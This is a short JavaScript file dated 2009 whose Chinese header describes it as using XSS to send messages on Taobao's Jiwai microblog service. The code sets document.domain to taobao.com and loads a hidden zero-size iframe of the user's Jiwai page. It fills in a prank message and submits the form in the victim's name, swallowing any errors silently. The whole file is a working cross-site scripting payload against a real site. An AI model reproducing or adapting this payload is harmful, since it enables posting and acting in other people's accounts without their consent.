// vim: set et sw=4 ts=4 sts=4 fdm=marker ff=unix fenc=gbk nobomb:
/**
 * 利用 XSS 发送淘宝叽歪信息
 *
 * @author mingcheng<i.feelinglucky#gmail.com>
 * @date   2009-10-20
 */

document.domain = 'taobao.com';
document.write('<script id="mootools" src="http://ajax.googleapis.com/ajax/libs/mootools/1.2.3/mootools-yui-compressed.js"></script>');

window.onload = function() {
   var iframe = new Element('iframe', {
        'src': 'http://jiwai.jianghu.taobao.com/jiwai/my_jiwai.htm',
        'style': 'width:0px;height:0px;',
        'id': '_getToken'
   });
   iframe.addEvent('load', function(e){
       try {
           var win = $('_getToken').contentWindow;
           var Y = win.YAHOO, Dom = Y.util.Dom, Event = Y.util.Event;
           Dom.get('share_textarea').value = '明城喊你回家吃饭！';
           Dom.get('form1').submit();
       } catch(e) {}
   });
   document.body.appendChild(iframe);
};
